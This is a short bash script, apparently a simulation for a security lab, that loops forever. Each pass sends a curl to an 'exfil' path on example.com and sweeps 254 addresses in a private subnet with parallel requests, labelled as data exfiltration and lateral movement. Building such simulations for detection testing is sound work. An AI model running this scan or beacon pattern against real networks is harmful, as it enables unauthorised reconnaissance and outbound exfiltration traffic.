#!/bin/bash
echo "Starting Tier 2 - Network attack"
while true; do
    # Data exfiltration simulation
    curl -s --max-time 5 http://example.com/exfil

    # Internal network scan - lateral movement simulation
    for i in $(seq 1 254); do
        curl -s --max-time 1 http://172.30.32.$i &
    done

    wait
    sleep 60
done
